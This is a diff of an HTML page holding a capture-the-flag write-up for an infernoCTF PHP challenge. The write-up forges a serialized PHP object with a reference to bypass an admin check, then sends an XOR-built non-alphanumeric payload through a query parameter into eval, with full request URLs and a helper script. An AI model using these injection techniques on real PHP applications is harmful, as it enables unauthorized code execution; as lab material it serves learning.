@@ -44,8 +44,7 @@
 
     </script>
     <script src="../../../js/base.js"></script>
-      <script src="../../../search/require.js"></script>
-      <script src="../../../search/search.js"></script> 
+      <script src="../../../search/main.js"></script> 
 </head>
 
 <body>
@@ -61,7 +60,6 @@ if (is_top_frame) { $('body').addClass('wm-top-page'); }
 
     
     
-      
       
     
 
@@ -98,7 +96,7 @@ if (is_top_frame) { $('body').addClass('wm-top-page'); }
 <h1 id="solution">Solution</h1>
 <p>The statement of the challenge was just a link to a page containing the following PHP code:
 http://104.197.168.32:17010/</p>
-<pre><code class="php">&lt;?php
+<pre><code class="language-php">&lt;?php
 include &quot;flag.php&quot;;
 
 show_source(__FILE__);
@@ -145,12 +143,11 @@ if (isset($_GET['id'])) {
 &gt;
 
 </code></pre>
-
 <p>I'm not good a PHP, however I decided to go over it to practice. </p>
 <p>The flag was divided in two parts, so lets go in order:</p>
 <h2 id="1st-flag-php-serialization">1st flag: PHP serialization</h2>
 <p>For this part, we are only going to focus on the following part of the code:</p>
-<pre><code class="php">&lt;?php
+<pre><code class="language-php">&lt;?php
 include &quot;flag.php&quot;;
 
 show_source(__FILE__);
@@ -171,7 +168,6 @@ if (isset($_GET['id'])) {
     if ($usr-&gt;name === &quot;admin&quot; &amp;&amp; $usr-&gt;pass === $usr-&gt;secret) {
       echo &quot;Congratulation! Here is something for you...  &quot; . $usr-&gt;pass;
 </code></pre>
-
 <p>In order to get the first part of the flag, we should be able to execute the last line. Therefore, we should met all the previous conditions in order to get there:
 1. We need to serialize an object with the format of the class User.
 2. We need to send this serialized object thought the <strong>id</strong> parameter.
@@ -181,7 +177,7 @@ if (isset($_GET['id'])) {
 <p>To start we need to serialize this object. How serialization works in PHP? No idea.
 I came across this <a href="http://irq5.io/2019/01/07/35c3-ctf-write-up-php/">blog</a>, which explain a little about it. However, the most important resource I got from here was the tool <strong>php-cli</strong> who let me test my own PHP code :). So now, instead of forging the PHP serialized object manually (first idea), let's let PHP forge it for us :). </p>
 <p>Once downloaded, I start writing my own code: </p>
-<pre><code class="php">&lt;?php
+<pre><code class="language-php">&lt;?php
 // Build the same class
 class user{
     var $name;
@@ -202,7 +198,6 @@ $user-&gt;pass = &amp;$user-&gt;secret;
 echo serialize($user);
 ?&gt;
 </code></pre>
-
 <p>The most important thing from this code was the part of the <strong>Aliasing</strong>. In order to get the same value as the attribute <strong>secret</strong> will have (the value of <strong>$flag1</strong>) we needed to define <strong>pass</strong> as a reference to 
 <strong>secret</strong>. </p>
 <p>The output of this code was:</p>
@@ -214,10 +209,9 @@ echo serialize($user);
 <pre><code>http://104.197.168.32:17010/?id=O:4:&quot;user&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:4:&quot;pass&quot;;s:8:&quot;ANYTHING&quot;;s:6:&quot;secret&quot;;R:3;}
 &lt;strong&gt;infernoCTF{pHp_1s_&lt;/strong&gt;
 </code></pre>
-
 <h2 id="2nd-flag-non-alphanumeric-code">2nd Flag: non-alphanumeric code</h2>
 <p>Once we are here, we can kind of forget of the previous part and just focus on the following piece of PHP code:</p>
-<pre><code class="php">if (isset($_GET['caption'])) {
+<pre><code class="language-php">if (isset($_GET['caption'])) {
     $cap = $_GET['caption'];
     if (strlen($cap) &gt; 45) {
         die(&quot;Naaaah, Take rest now&quot;);
@@ -232,7 +226,6 @@ else {
     echo &quot;NVM You are not eligible&quot;;
 }
 </code></pre>
-
 <p>At first, to solve this, I thought the following possibilities:
 1. Bypass the regex. 
 2. Exploit some vulnerability in <strong>preg_match</strong>. 
@@ -242,17 +235,16 @@ else {
 Therefore, I built my own payload, using his trick. Let's first explain a little bit about it. </p>
 <h3 id="the-trick">The trick</h3>
 <p>Quick and dirty explained, the trick consists on definint a variable as a symbol, and then xoring it with another symbol to get the letter you want. For example, if you XOR the symbols <strong>}</strong> and <strong>&lt;</strong> you get a <strong>G</strong>:</p>
-<pre><code class="php">&lt;?php
+<pre><code class="language-php">&lt;?php
 $_=&quot;{&quot;;
 $_=($_^&quot;&lt;&quot;);
 echo $_;'
 &gt;
 </code></pre>
-
 <p>The answer will be <strong>G</strong>. </p>
 <p>Therefore, going back to our example, my idea was to use this to build the string <strong>echoFlag();</strong> which would be executed later on by the <strong>eval</strong>. </p>
 <p>We had to find a combination of symbols that once xored, will write the each of the letter of <strong>echoFlag</strong>. In order to get that I wrote a tiny and dirty python script:</p>
-<pre><code class="python">def get_symbols_for(needed_char):
+<pre><code class="language-python">def get_symbols_for(needed_char):
     symbols = &quot;!\&quot;#$%&amp;\'()*+,-./:;?@[\\]^_`{|}~&quot;
     for symbol in symbols:
         blah = chr(ord(symbol) ^ ord(needed_char))
@@ -264,7 +256,6 @@ echo $_;'
 for char in &quot;echoFlag&quot;:
     get_symbols_for(char)
 </code></pre>
-
 <p>Once executed the answer was: </p>
 <pre><code>Symbols @ and % can be usd for char e
 Symbols @ and # can be usd for char c
@@ -275,10 +266,9 @@ Symbols @ and , can be usd for char l
 Symbols @ and ! can be usd for char a
 Symbols &lt; and [ can be usd for char g
 </code></pre>
-
 <p>Cool. Now we have which symbols we need to xor to get our string. </p>
 <p>Let's test locally if this will work: </p>
-<pre><code class="php">&lt;?php
+<pre><code class="language-php">&lt;?php
 function echoFlag(){
     echo &quot;It has been called!&quot;;
 }
@@ -287,7 +277,6 @@ $cap = '$_=(&quot;%#(/{,![&quot;^&quot;@@@@=@@&lt;&quot;);$_();';
 eval($cap);
 ?&gt;
 </code></pre>
-
 <p><strong>This is the last version, I went trough some intermediate states that I don't thing are relevant</strong>.</p>
 <p>Once executed, the output was:
 <strong>It has been called!</strong>. </p>
@@ -296,7 +285,6 @@ Let's send this payload through the <strong>cap</strong> parameter (don't forget
 <pre><code>http://104.197.168.32:17010/?id=O:4:&quot;user&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:4:&quot;pass&quot;;s:8:&quot;ANYTHING&quot;;s:6:&quot;secret&quot;;R:3;}&amp;caption=$_=(&quot;%#(/{,![&quot;^&quot;@@@@=@@&lt;&quot;);$_();
 &lt;strong&gt;infernoCTF{pHp_1s_&lt;/strong&gt;
 </code></pre>
-
 <p>Buhh! It didn't work. After some time, I figured it out that was because the <strong>#</strong> wasn't encoded :|. 
 Let's try again: </p>
 <pre><code>http://104.197.168.32:17010/?id=O:4:&quot;user&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:4:&quot;pass&quot;;s:8:&quot;ANYTHING&quot;;s:6:&quot;secret&quot;;R:3;}&amp;caption=$_=(&quot;%%23(/{,![&quot;^&quot;@@@@=@@&lt;&quot;);$_();
@@ -305,7 +293,6 @@ Let's try again: </p>
 &lt;br&gt;
 &lt;strong&gt;a_h34dache}
 </code></pre>
-
 <p>Yess! Here is the second part of the flag: <strong>ia_h34dache}</strong>
 And we use only 32 chars instead of the max 45 (;))</p>
 <h1 id="flag">Flag</h1>
